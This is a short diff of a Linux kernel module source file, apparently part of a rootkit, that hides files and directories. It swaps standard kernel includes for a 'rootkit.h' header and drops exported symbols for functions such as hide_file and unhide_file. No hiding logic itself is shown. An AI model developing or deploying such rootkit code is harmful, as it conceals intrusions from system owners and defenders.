@@ -1,23 +1,12 @@
 /*
- * Advanced File Hiding Implementation
- * Provides multiple methods to hide files and directories
- * Kernel Version: 5.15.142
+ * File Hiding Implementation
+ * Advanced techniques for hiding files and directories
  */
 
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/syscalls.h>
-#include <linux/dirent.h>
-#include <linux/fs.h>
-#include <linux/uaccess.h>
-#include <linux/slab.h>
-#include <linux/string.h>
-#include <linux/list.h>
-#include <linux/mutex.h>
-#include <linux/proc_fs.h>
-#include <linux/seq_file.h>
+#include "rootkit.h"
 #include <linux/namei.h>
 #include <linux/dcache.h>
+#include <linux/mutex.h>
 
 #define MAX_HIDDEN_FILES 1000
 #define MAX_FILENAME_LEN 256
@@ -498,10 +487,4 @@ void cleanup_file_hiding(void) {
 }
 
 // 导出符号
-EXPORT_SYMBOL(hide_file);
-EXPORT_SYMBOL(hide_file_with_path);
-EXPORT_SYMBOL(unhide_file);
-EXPORT_SYMBOL(get_hidden_files_count);
-EXPORT_SYMBOL(get_hidden_files_info);
-EXPORT_SYMBOL(init_file_hiding);
-EXPORT_SYMBOL(cleanup_file_hiding);
+// Functions are part of the same module, no need to export
